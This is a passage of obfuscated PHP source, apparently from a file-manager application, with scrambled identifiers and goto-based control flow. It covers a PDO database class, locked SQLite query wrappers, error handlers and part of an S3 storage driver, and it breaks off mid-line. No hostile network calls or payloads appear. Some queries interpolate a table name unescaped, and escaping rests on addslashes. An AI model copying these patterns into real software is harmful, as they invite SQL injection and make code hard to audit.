bƒŸŠ•ƒƒË: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($E¼“Ó¦Ì±´ = '') { $fË×¼Éãæ¶ =& $_SERVER[°Óó£ÌİóèÅ]; if (!class_exists($fË×¼Éãæ¶[593])) { think_exception(think_lang($fË×¼Éãæ¶[10]) . $fË×¼Éãæ¶[594]); } if (!empty($E¼“Ó¦Ì±´)) { $this->config = $E¼“Ó¦Ì±´; if (empty($this->config[$fË×¼Éãæ¶[13]])) { $this->config[$fË×¼Éãæ¶[13]] = array(); } } } public function connect($eéÙÁ˜ Ç´ = '', $eµŒ™¼ éÏ = 0) { $DÌåºä´ë‡ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($this->linkID[$eµŒ™¼ éÏ])) { goto A¿Ÿœ´Şõì; a²ËµÆâƒ: $this->dbType = $this->_getDsnType($eéÙÁ˜ Ç´[$DÌåºä´ë‡[595]]); if (in_array($this->dbType, array($DÌåºä´ë‡[596], $DÌåºä´ë‡[597], $DÌåºä´ë‡[598], $DÌåºä´ë‡[599]))) { think_exception($DÌåºä´ë‡[600] . $this->dbType . $DÌåºä´ë‡[601] . $this->dbType . $DÌåºä´ë‡[602]); } if (!$this->linkID[$eµŒ™¼ éÏ]) { think_exception($DÌåºä´ë‡[603]); } goto e»ç¹„°…Ä; e»ç¹„°…Ä: $this->linkID[$eµŒ™¼ éÏ]->exec($DÌåºä´ë‡[604] . think_config($DÌåºä´ë‡[570])); $this->connected = !0; if (1 != think_config($DÌåºä´ë‡[18])) { unset($this->config); } goto C¯²Ú«†½; A¿Ÿœ´Şõì: if (empty($eéÙÁ˜ Ç´)) { $eéÙÁ˜ Ç´ = $this->config; } if ($this->pconnect) { $eéÙÁ˜ Ç´[$DÌåºä´ë‡[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$eµŒ™¼ éÏ] = new PDO($eéÙÁ˜ Ç´[$DÌåºä´ë‡[595]], $eéÙÁ˜ Ç´[$DÌåºä´ë‡[567]], $eéÙÁ˜ Ç´[$DÌåºä´ë‡[568]], $eéÙÁ˜ Ç´[$DÌåºä´ë‡[13]]); } catch (PDOException $AÚ…è¿¹‡Œ) { think_exception($AÚ…è¿¹‡Œ->getMessage()); } goto a²ËµÆâƒ; C¯²Ú«†½: } return $this->linkID[$eµŒ™¼ éÏ]; } public function free() { $this->PDOStatement = null; } public function query($Bº¹ƒ¦É, $Fà»òµšÙ¿ = array()) { goto f¾·«·ó‹; CÅ¬µÛŒ: think_action_status($cµ¿ŞÅÌ»[19], 1); think_status($cµ¿ŞÅÌ»[20]); $this->PDOStatement = $this->_linkID->prepare($Bº¹ƒ¦É); goto c§ïß‹ÕµÖ; c§ïß‹ÕµÖ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $e±À•Ç¤œ = $this->PDOStatement->execute($Fà»òµšÙ¿); $this->debug(); goto e‚Öó”; d’‚ÕÃÆãƒ: $this->queryStr = $Bº¹ƒ¦É; if (!empty($Fà»òµšÙ¿)) { $this->queryStr .= $cµ¿ŞÅÌ»[605] . print_r($Fà»òµšÙ¿, !0) . $cµ¿ŞÅÌ»[606]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CÅ¬µÛŒ; e‚Öó”: if (!1 === $e±À•Ç¤œ) { $this->error(); return !1; } else { return $this->getAll(); } goto FÃá”Ö“È; f¾·«·ó‹: $cµ¿ŞÅÌ» =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d’‚ÕÃÆãƒ; FÃá”Ö“È: } public function execute($CÀô¦Ø·Ò, $bŸ«¿ÃØëø = array()) { goto bã§ĞßˆÆœ; A¥¼¤ù®ĞÆ: if ($this->dbType == $Bğ¥¿¤ëšÕ[599]) { if (preg_match($Bğ¥¿¤ëšÕ[607], $this->queryStr, $aòˆ³‰Öİç)) { $this->table = think_config($Bğ¥¿¤ëšÕ[608]) . str_ireplace(think_config($Bğ¥¿¤ëšÕ[609]), $Bğ¥¿¤ëšÕ[371], $aòˆ³‰Öİç[2]); $féÇ†¹Æ¥ç = (bool) $this->query($Bğ¥¿¤ëšÕ[610] . strtoupper($this->table) . $Bğ¥¿¤ëšÕ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Bğ¥¿¤ëšÕ[21], 1); goto D„‚ö‘ô­‚; bã§ĞßˆÆœ: $Bğ¥¿¤ëšÕ =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dÈ—¬ù»¯; dÈ—¬ù»¯: $this->queryStr = $CÀô¦Ø·Ò; if (!empty($bŸ«¿ÃØëø)) { $this->queryStr .= $Bğ¥¿¤ëšÕ[605] . print_r($bŸ«¿ÃØëø, !0) . $Bğ¥¿¤ëšÕ[606]; } $féÇ†¹Æ¥ç = !1; goto A¥¼¤ù®ĞÆ; E„Àİ£ÓŠŒ: $fêÍÁñÙ† = $this->PDOStatement->execute($bŸ«¿ÃØëø); $this->debug(); if (!1 === $fêÍÁñÙ†) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($féÇ†¹Æ¥ç || preg_match($Bğ¥¿¤ëšÕ[611], $CÀô¦Ø·Ò)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Bí¸„Ï©æç; D„‚ö‘ô­‚: think_status($Bğ¥¿¤ëšÕ[20]); $this->PDOStatement = $this->_linkID->prepare($CÀô¦Ø·Ò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto E„Àİ£ÓŠŒ; Bí¸„Ï©æç: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E£Û¦µÉ„ï = $this->_linkID->commit(); $this->transTimes = 0; if (!$E£Û¦µÉ„ï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÏá‹ÜÅ† = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aÏá‹ÜÅ†) { $this->error(); return !1; } } return !0; } private function getAll() { $bàç‰‘Î” = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($bàç‰‘Î”); return $bàç‰‘Î”; } public function getFields($Fô‘ê¼÷ì…) { goto D´¨‘âºÃ; dò¿×¿ù¿©: $CŞ†Ò˜—Ä = $this->query($a‰²Ô÷¨é); $b¼øîô¾Ñ¬ = array(); if ($CŞ†Ò˜—Ä) { foreach ($CŞ†Ò˜—Ä as $F†ÛâÖ–ñô => $EÁ²ìÚ‡ğš) { $EÁ²ìÚ‡ğš = array_change_key_case($EÁ²ìÚ‡ğš); $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[28]] = isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[28]]) ? $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[28]] : $a¶·ìêÛ¬Ê[371]; $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[29]] = isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[29]]) ? $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[29]] : $a¶·ìêÛ¬Ê[371]; $F­ Š™Õ = isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[272]]) ? $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[272]] : $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[28]]; $b¼øîô¾Ñ¬[$F­ Š™Õ] = array($a¶·ìêÛ¬Ê[28] => $F­ Š™Õ, $a¶·ìêÛ¬Ê[29] => $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[29]], $a¶·ìêÛ¬Ê[31] => (bool) (isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[108]]) && $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[108]] === $a¶·ìêÛ¬Ê[33] || isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[31]]) && $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[31]] === $a¶·ìêÛ¬Ê[33]), $a¶·ìêÛ¬Ê[34] => isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[34]]) ? $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[34]] : (isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[53]]) ? $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[53]] : $a¶·ìêÛ¬Ê[371]), $a¶·ìêÛ¬Ê[36] => isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[96]]) ? strtolower($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[96]]) == $a¶·ìêÛ¬Ê[38] : (isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[54]]) ? $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[54]] : !1), $a¶·ìêÛ¬Ê[39] => isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[628]]) ? strtolower($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[628]]) == $a¶·ìêÛ¬Ê[41] : (isset($EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[96]]) ? $EÁ²ìÚ‡ğš[$a¶·ìêÛ¬Ê[96]] : !1)); } } goto dÃØƒÃ…„·; D´¨‘âºÃ: $a¶·ìêÛ¬Ê =& $_SERVER[°Óó£ÌİóèÅ]; $this->initConnect(!0); if (think_config($a¶·ìêÛ¬Ê[612])) { $a‰²Ô÷¨é = str_replace($a¶·ìêÛ¬Ê[613], $Fô‘ê¼÷ì…, think_config($a¶·ìêÛ¬Ê[612])); } else { switch ($this->dbType) { case $a¶·ìêÛ¬Ê[596]: case $a¶·ìêÛ¬Ê[614]: $a‰²Ô÷¨é = "\123\x45\x4c\x45\x43\124\x20\40\40\143\157\154\165\x6d\156\x5f\x6e\141\155\x65\40\x61\163\x20\x27\x4e\141\155\145\47\x2c\x20\x20\40\x64\141\x74\x61\137\x74\x79\160\x65\x20\x61\x73\x20\x27\124\x79\x70\145\47\54\x20\x20\40\143\157\x6c\x75\x6d\156\x5f\x64\x65\146\141\165\154\164\40\x61\163\x20\x27\x44\145\146\141\x75\154\x74\x27\x2c\x20\40\40\151\x73\137\156\x75\x6c\x6c\x61\x62\154\x65\x20\141\x73\40\x27\116\x75\154\154\x27\12\11\x9\106\x52\117\x4d\x9\x69\156\x66\x6f\162\155\141\x74\x69\x6f\x6e\137\x73\x63\150\145\x6d\141\56\164\141\x62\154\145\163\x20\x41\x53\40\164\xa\11\11\112\117\x49\x4e\11\151\156\x66\x6f\162\x6d\141\164\151\x6f\156\137\x73\x63\x68\145\155\141\56\143\x6f\154\165\x6d\156\163\x20\101\123\x20\143\12\x9\11\117\116\40\40\x74\56\x74\x61\142\x6c\x65\137\143\x61\164\141\154\x6f\147\x20\x3d\x20\x63\x2e\x74\x61\x62\154\145\x5f\x63\x61\164\x61\154\x6f\x67\xa\11\11\x41\x4e\x44\x20\164\x2e\164\141\x62\x6c\145\137\163\x63\x68\145\x6d\141\x20\75\40\143\x2e\x74\141\x62\x6c\x65\137\163\x63\150\145\x6d\141\xa\11\x9\101\x4e\x44\x20\164\x2e\x74\x61\142\154\145\x5f\x6e\141\x6d\145\x20\75\x20\143\x2e\164\x61\142\154\x65\137\x6e\141\155\145\xa\11\11\127\x48\105\122\105\40\40\x20\164\56\x74\141\142\x6c\x65\137\156\141\x6d\145\x20\75\40\x27{$Fô‘ê¼÷ì…}\47"; break; case $a¶·ìêÛ¬Ê[615]: $a‰²Ô÷¨é = $a¶·ìêÛ¬Ê[616] . $Fô‘ê¼÷ì… . $a¶·ìêÛ¬Ê[617]; break; case $a¶·ìêÛ¬Ê[597]: case $a¶·ìêÛ¬Ê[599]: $a‰²Ô÷¨é = $a¶·ìêÛ¬Ê[618] . $a¶·ìêÛ¬Ê[619] . $a¶·ìêÛ¬Ê[620] . strtoupper($Fô‘ê¼÷ì…) . $a¶·ìêÛ¬Ê[621] . strtoupper($Fô‘ê¼÷ì…) . $a¶·ìêÛ¬Ê[622]; break; case $a¶·ìêÛ¬Ê[623]: $a‰²Ô÷¨é = $a¶·ìêÛ¬Ê[624] . $Fô‘ê¼÷ì… . $a¶·ìêÛ¬Ê[625]; break; case $a¶·ìêÛ¬Ê[598]: break; case $a¶·ìêÛ¬Ê[626]: default: $a‰²Ô÷¨é = $a¶·ìêÛ¬Ê[627] . ($this->dbType == $a¶·ìêÛ¬Ê[626] ? "\140{$Fô‘ê¼÷ì…}\140" : $Fô‘ê¼÷ì…); } } goto dò¿×¿ù¿©; dÃØƒÃ…„·: return $b¼øîô¾Ñ¬; goto a®™ËÙíøì; a®™ËÙíøì: } public function getTables($CéÚ«Êù£ = '') { $D¸Å­”øñİ =& $_SERVER[°Óó£ÌİóèÅ]; if (think_config($D¸Å­”øñİ[629])) { $Aà¼³ŞãÑ = str_replace($D¸Å­”øñİ[630], $CéÚ«Êù£, think_config($D¸Å­”øñİ[629])); } else { switch ($this->dbType) { case $D¸Å­”øñİ[597]: case $D¸Å­”øñİ[599]: $Aà¼³ŞãÑ = $D¸Å­”øñİ[631]; break; case $D¸Å­”øñİ[596]: case $D¸Å­”øñİ[614]: $Aà¼³ŞãÑ = $D¸Å­”øñİ[632]; break; case $D¸Å­”øñİ[623]: $Aà¼³ŞãÑ = $D¸Å­”øñİ[633]; break; case $D¸Å­”øñİ[598]: think_exception(think_lang($D¸Å­”øñİ[634]) . $D¸Å­”øñİ[635]); break; case $D¸Å­”øñİ[615]: $Aà¼³ŞãÑ = $D¸Å­”øñİ[42] . $D¸Å­”øñİ[43] . $D¸Å­”øñİ[44]; break; case $D¸Å­”øñİ[626]: default: if (!empty($CéÚ«Êù£)) { $Aà¼³ŞãÑ = $D¸Å­”øñİ[578] . $CéÚ«Êù£; } else { $Aà¼³ŞãÑ = $D¸Å­”øñİ[579]; } } } $FÏ²åÆŞ = $this->query($Aà¼³ŞãÑ); $FÉïñàÆùÚ = array(); foreach ($FÏ²åÆŞ as $Cµ’ØÓó¢ => $c³ƒÄµÃš) { $FÉïñàÆùÚ[$Cµ’ØÓó¢] = current($c³ƒÄµÃš); } return $FÉïñàÆùÚ; } protected function parseLimit($BÛª÷Éš¥ì) { $a§¼ŞÉÇßë =& $_SERVER[°Óó£ÌİóèÅ]; $FŠõ²Çæ­¥ = $a§¼ŞÉÇßë[33]; if (!empty($BÛª÷Éš¥ì)) { switch ($this->dbType) { case $a§¼ŞÉÇßë[623]: case $a§¼ŞÉÇßë[615]: $BÛª÷Éš¥ì = explode($a§¼ŞÉÇßë[47], $BÛª÷Éš¥ì); if (count($BÛª÷Éš¥ì) > 1) { $FŠõ²Çæ­¥ .= $a§¼ŞÉÇßë[48] . $BÛª÷Éš¥ì[1] . $a§¼ŞÉÇßë[49] . $BÛª÷Éš¥ì[0] . $a§¼ŞÉÇßë[50]; } else { $FŠõ²Çæ­¥ .= $a§¼ŞÉÇßë[48] . $BÛª÷Éš¥ì[0] . $a§¼ŞÉÇßë[50]; } break; case $a§¼ŞÉÇßë[596]: case $a§¼ŞÉÇßë[614]: break; case $a§¼ŞÉÇßë[598]: break; case $a§¼ŞÉÇßë[597]: case $a§¼ŞÉÇßë[599]: break; case $a§¼ŞÉÇßë[626]: default: $FŠõ²Çæ­¥ .= $a§¼ŞÉÇßë[48] . $BÛª÷Éš¥ì . $a§¼ŞÉÇßë[50]; } } return $FŠõ²Çæ­¥; } public function parseKey(&$BÄŒÇ³Œİ‚, $c¢Ò× Äù› = true) { $E®öÉÜÍÄÆ =& $_SERVER[°Óó£ÌİóèÅ]; if ($c¢Ò× Äù›) { $BÄŒÇ³Œİ‚ = $this->parseKeyCheck($BÄŒÇ³Œİ‚); } if ($this->dbType == $E®öÉÜÍÄÆ[626]) { if ($BÄŒÇ³Œİ‚ != $E®öÉÜÍÄÆ[181] && !preg_match($E®öÉÜÍÄÆ[589], $BÄŒÇ³Œİ‚)) { $BÄŒÇ³Œİ‚ = $E®öÉÜÍÄÆ[590] . trim($BÄŒÇ³Œİ‚, $E®öÉÜÍÄÆ[590]) . $E®öÉÜÍÄÆ[590]; } return $BÄŒÇ³Œİ‚; } else { return parent::parseKey($BÄŒÇ³Œİ‚); } } public function close() { $this->_linkID = null; } public function error() { $d¡±‰ó÷§ì =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->PDOStatement) { $A¶Š§³¸ãë = $this->PDOStatement->errorInfo(); $this->error = $A¶Š§³¸ãë[1] . $d¡±‰ó÷§ì[4] . $A¶Š§³¸ãë[2]; } else { $this->error = $d¡±‰ó÷§ì[33]; } if ($d¡±‰ó÷§ì[33] != $this->queryStr) { $this->error .= LNG($d¡±‰ó÷§ì[45]) . $this->queryStr; } think_trace($this->error, $d¡±‰ó÷§ì[33], $d¡±‰ó÷§ì[46]); return $this->error; } public function escapeString($bƒØØÎ‚Æî) { $eŒ¸œÃÃ÷” =& $_SERVER[°Óó£ÌİóèÅ]; switch ($this->dbType) { case $eŒ¸œÃÃ÷”[623]: case $eŒ¸œÃÃ÷”[596]: case $eŒ¸œÃÃ÷”[614]: case $eŒ¸œÃÃ÷”[626]: return addslashes($bƒØØÎ‚Æî); case $eŒ¸œÃÃ÷”[598]: case $eŒ¸œÃÃ÷”[615]: case $eŒ¸œÃÃ÷”[597]: case $eŒ¸œÃÃ÷”[599]: return str_ireplace($eŒ¸œÃÃ÷”[55], $eŒ¸œÃÃ÷”[56], $bƒØØÎ‚Æî); } } protected function parseValue($dí‰ƒÀò›å) { $a¬ŒÊÒÆ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_string($dí‰ƒÀò›å)) { $dí‰ƒÀò›å = strpos($dí‰ƒÀò›å, $a¬ŒÊÒÆ[4]) === 0 ? $this->escapeString($dí‰ƒÀò›å) : $a¬ŒÊÒÆ[636] . $this->escapeString($dí‰ƒÀò›å) . $a¬ŒÊÒÆ[636]; } elseif (isset($dí‰ƒÀò›å[0]) && is_string($dí‰ƒÀò›å[0]) && strtolower($dí‰ƒÀò›å[0]) == $a¬ŒÊÒÆ[296]) { $dí‰ƒÀò›å = $this->escapeString($dí‰ƒÀò›å[1]); } elseif (is_array($dí‰ƒÀò›å)) { $dí‰ƒÀò›å = array_map(array($this, $a¬ŒÊÒÆ[637]), $dí‰ƒÀò›å); } elseif (is_bool($dí‰ƒÀò›å)) { $dí‰ƒÀò›å = $dí‰ƒÀò›å ? $a¬ŒÊÒÆ[384] : $a¬ŒÊÒÆ[410]; } elseif (is_null($dí‰ƒÀò›å)) { $dí‰ƒÀò›å = $a¬ŒÊÒÆ[108]; } return $dí‰ƒÀò›å; } public function getLastInsertId() { $E¿ØÖºø¹› =& $_SERVER[°Óó£ÌİóèÅ]; switch ($this->dbType) { case $E¿ØÖºø¹›[623]: case $E¿ØÖºø¹›[615]: case $E¿ØÖºø¹›[596]: case $E¿ØÖºø¹›[614]: case $E¿ØÖºø¹›[598]: case $E¿ØÖºø¹›[626]: return $this->_linkID->lastInsertId(); case $E¿ØÖºø¹›[597]: case $E¿ØÖºø¹›[599]: $E Ì¶Í§Ğ = $this->table; $B´¢‰å±Æ¥ = $this->query("\x53\105\x4c\105\x43\x54\40{$E Ì¶Í§Ğ}\56\x63\165\162\x72\166\141\154\40\143\165\x72\162\166\x61\x6c\40\x46\x52\x4f\x4d\x20\x64\165\x61\x6c"); return $B´¢‰å±Æ¥ ? $B´¢‰å±Æ¥[0][$E¿ØÖºø¹›[638]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($dˆÛî†®ÒÏ) { goto c£µÕÇ»¢; dŒ²‚ ²•Š: show_json($dô®—ÀÕ[641], !1); return !1; goto d·ÑÏÓÒ¤; A±í¯ŒÆé: if (flock($d¶ÈĞáÃ¼ê, LOCK_EX)) { $Fæ¤¸‰‘Ã° = parent::query($dˆÛî†®ÒÏ); flock($d¶ÈĞáÃ¼ê, LOCK_UN); fclose($d¶ÈĞáÃ¼ê); return $Fæ¤¸‰‘Ã°; } flock($d¶ÈĞáÃ¼ê, LOCK_UN); fclose($d¶ÈĞáÃ¼ê); goto dŒ²‚ ²•Š; c£µÕÇ»¢: $dô®—ÀÕ =& $_SERVER[°Óó£ÌİóèÅ]; $eßÅñÆËŠœ = DATA_PATH . $dô®—ÀÕ[639]; $d¶ÈĞáÃ¼ê = fopen($eßÅñÆËŠœ, $dô®—ÀÕ[640]); goto A±í¯ŒÆé; d·ÑÏÓÒ¤: } public function execute($dÅõÎ«ğ¤) { goto f‡”ŒŞ—¶¼; f‡”ŒŞ—¶¼: $BÖİ«Ùè©é =& $_SERVER[°Óó£ÌİóèÅ]; $eßæÎæÂ¡ = DATA_PATH . $BÖİ«Ùè©é[639]; $C™—­•Ã = fopen($eßæÎæÂ¡, $BÖİ«Ùè©é[640]); goto eİĞñ—Ìñœ; aèŸ†ùÖ: show_json($BÖİ«Ùè©é[641], !1); return !1; goto eÆ¼ĞÆ¿âô; eİĞñ—Ìñœ: if (flock($C™—­•Ã, LOCK_EX)) { $añ·ä¢¬æ = parent::execute($dÅõÎ«ğ¤); flock($C™—­•Ã, LOCK_UN); fclose($C™—­•Ã); return $añ·ä¢¬æ; } flock($C™—­•Ã, LOCK_UN); fclose($C™—­•Ã); goto aèŸ†ùÖ; eÆ¼ĞÆ¿âô: } } class DbSqlite3 extends DbSqlite3Base { public function query($dØ­øÇÑğš) { goto f¼“º¹àÃ; f¼“º¹àÃ: $eÁöÌÃ ø =& $_SERVER[°Óó£ÌİóèÅ]; $Eë°÷š«›ñ = DATA_PATH . $eÁöÌÃ ø[639]; $Fº™Ş°‘ØÜ = fopen($Eë°÷š«›ñ, $eÁöÌÃ ø[640]); goto FÂ‰Æ™Ò³ä; FÂ‰Æ™Ò³ä: if (flock($Fº™Ş°‘ØÜ, LOCK_EX)) { $Fá”ùÙä© = parent::query($dØ­øÇÑğš); flock($Fº™Ş°‘ØÜ, LOCK_UN); fclose($Fº™Ş°‘ØÜ); return $Fá”ùÙä©; } flock($Fº™Ş°‘ØÜ, LOCK_UN); fclose($Fº™Ş°‘ØÜ); goto EƒÏîëˆ¤; EƒÏîëˆ¤: show_json($eÁöÌÃ ø[641], !1); return !1; goto DÖÁÉªÙ¤; DÖÁÉªÙ¤: } public function execute($E•îä‹ßßæ) { goto c•ùÇ÷¯†‡; CÒî„¹…³ª: show_json($DÂ‘œôä¤[641], !1); return !1; goto dÑà†²ÖäÛ; c•ùÇ÷¯†‡: $DÂ‘œôä¤ =& $_SERVER[°Óó£ÌİóèÅ]; $E¿Í£øÎÎ° = DATA_PATH . $DÂ‘œôä¤[639]; $c°àÎÍ¾å = fopen($E¿Í£øÎÎ°, $DÂ‘œôä¤[640]); goto e…¦çˆ¢íº; e…¦çˆ¢íº: if (flock($c°àÎÍ¾å, LOCK_EX)) { $E½ç„Ñ›¢¦ = parent::execute($E•îä‹ßßæ); flock($c°àÎÍ¾å, LOCK_UN); fclose($c°àÎÍ¾å); return $E½ç„Ñ›¢¦; } flock($c°àÎÍ¾å, LOCK_UN); fclose($c°àÎÍ¾å); goto CÒî„¹…³ª; dÑà†²ÖäÛ: } } goto C‘ë‰İÍùˆ; eÏĞáÃ×æˆ: function beforeShutdownError($E“Å¦ìù± = false, $CÍÈ×äà™ì = '', $Dß´«ëê› = '', $Eù±¾æ¸Á = 0) { $a…ãÉ³‡° =& $_SERVER[³ªí]; switch ($E“Å¦ìù±) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $b¾“Òãµ©³ = $a…ãÉ³‡°[20]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $b¾“Òãµ©³ = $a…ãÉ³‡°[21]; break; case E_STRICT: $b¾“Òãµ©³ = $a…ãÉ³‡°[22]; break; case E_NOTICE: case E_USER_NOTICE: $b¾“Òãµ©³ = $a…ãÉ³‡°[23]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $b¾“Òãµ©³ = $a…ãÉ³‡°[24]; break; default: break; } if (!$b¾“Òãµ©³ || $b¾“Òãµ©³ == $a…ãÉ³‡°[23] || $b¾“Òãµ©³ == $a…ãÉ³‡°[24]) { return; } $Dß´«ëê› = $a…ãÉ³‡°[2] . str_replace(BASIC_PATH, $a…ãÉ³‡°[25], $Dß´«ëê›); $a“Òšğ‘Àª = $b¾“Òãµ©³ . $a…ãÉ³‡°[26] . $CÍÈ×äà™ì . $a…ãÉ³‡°[26] . $Dß´«ëê› . $a…ãÉ³‡°[26] . $Eù±¾æ¸Á; write_log($a“Òšğ‘Àª . $a…ãÉ³‡°[16] . get_caller_msg(), $a…ãÉ³‡°[17]); } function beforeShutdownFatalError($BÃ÷ôôÛÛ²) { think_exception($BÃ÷ôôÛÛ²); } $Cö¨ªØ‚öŞ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto fÛïÒôÏŒŸ; B·Â¥ÎÓ¼«: class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public function __construct($c°åÊõ¾•¸) { set_timeout(); require_once SDK_DIR . $_SERVER[°Óó£ÌİóèÅ][178]; parent::__construct(); $this->_init($c°åÊõ¾•¸); } public function _init($c“Ã’Çö™ñ) { foreach ($c“Ã’Çö™ñ as $Eí»‹µ°â¡ => $CÑåæ³Éï‘) { if (isset($this->{$Eí»‹µ°â¡})) { $this->{$Eí»‹µ°â¡} = $CÑåæ³Éï‘; } } $this->endpoint = $c“Ã’Çö™ñ[$_SERVER[°Óó£ÌİóèÅ][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($E‡¢”Áì = "\x76\x34") { $this->signVer = $E‡¢”Áì; $this->client->setSignatureVersion($E‡¢”Áì); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto dšõ„Ò†‡ï; fš¸ÇìÏõ: $bœ‘à…Á¨ø = array($A«ÀÊˆ¿õê[185], $A«ÀÊˆ¿õê[186], $A«ÀÊˆ¿õê[187], $A«ÀÊˆ¿õê[188], $A«ÀÊˆ¿õê[189]); $E÷è¾ìŸÇ = array_diff($bœ‘à…Á¨ø, $dªÙ¯¤®Ş­); return empty($E÷è¾ìŸÇ); goto a£ã„ëŞø¶; F‡¦±ïÚÅÀ: if ($Cİˆ–ÏÉ‰[$A«ÀÊˆ¿õê[180]] != $A«ÀÊˆ¿õê[181] || $Cİˆ–ÏÉ‰[$A«ÀÊˆ¿õê[182]] != $A«ÀÊˆ¿õê[181]) { return !1; } $dªÙ¯¤®Ş­ = array_map($A«ÀÊˆ¿õê[183], $Cİˆ–ÏÉ‰[$A«ÀÊˆ¿õê[184]]); if (!is_array($dªÙ¯¤®Ş­)) { $dªÙ¯¤®Ş­ = array(); } goto fš¸ÇìÏõ; dšõ„Ò†‡ï: $A«ÀÊˆ¿õê =& $_SERVER[°Óó£ÌİóèÅ]; $Cİˆ–ÏÉ‰ = $this->getBucketCors(); if (!$Cİˆ–ÏÉ‰ || !is_array($Cİˆ–ÏÉ‰)) { return !1; } goto F‡¦±ïÚÅÀ; a£ã„ëŞø¶: } public function mkfile($EÃ©©Œáé‹, $eÖ£áÅ¤Ê… = '', $Fƒíµù×Ö» = REPEAT_RENAME) { $fÒª™×àêÂ = $this->setContent($EÃ©©Œáé‹, $eÖ£áÅ¤Ê…); if ($fÒª™×àêÂ !== !1) { return $this->getPathOuter($EÃ©©Œáé‹); } return !1; } public function mkdir($AÕ©ÍŞ§Â£, $fƒË‰ç™Ãò = REPEAT_SKIP) { if (empty($AÕ©ÍŞ§Â£)) { return !1; } if ($this->_isFolder($AÕ©ÍŞ§Â£)) { return $this->getPathOuter($AÕ©ÍŞ§Â£); } $cÛ£š›Æ‚ô = $this->setContent($AÕ©ÍŞ§Â£, $_SERVER[°Óó£ÌİóèÅ][33], !0); if ($cÛ£š›Æ‚ô !== !1) { return $this->getPathOuter($AÕ©ÍŞ§Â£); } return !1; } public function copyFile($FÉÆ’Í„±ƒ, $A‚òÑÉÕÄİ, $B­ÛˆÜ±Õ = array()) { $C¾ì„œù™ë =& $_SERVER[°Óó£ÌİóèÅ]; $F«ªˆô—ƒ = $this->getObjectInfo($FÉÆ’Í„±ƒ); if (!$F«ªˆô—ƒ) { return !1; } if ($F«ªˆô—ƒ[$C¾ì„œù™ë[86]] <= 1024 * 1024 * 200) { $F“¶ï™İÕº = $this->client->copyObject($this->bucket, $FÉÆ’Í„±ƒ, $this->bucket, $A‚òÑÉÕÄİ, $C¾ì„œù™ë[190], $B­ÛˆÜ±Õ); } else { $F“¶ï™İÕº = $this->client->multiCopyObject($this->bucket, $FÉÆ’Í„±ƒ, $this->bucket, $A‚òÑÉÕÄİ, $B­ÛˆÜ±Õ); } $F“¶ï™İÕº = $F“¶ï™İÕº ? $this->getPathOuter($A‚òÑÉÕÄİ) : !1; return $F“¶ï™İÕº; } public function moveFile($a¡’™·—İ¤, $FÃÀˆ¦¹í‡) { if ($this->copyFile($a¡’™·—İ¤, $FÃÀˆ¦¹í‡)) { $this->delFile($a¡’™·—İ¤); return $this->getPathOuter($FÃÀˆ¦¹í‡); } return !1; } public function 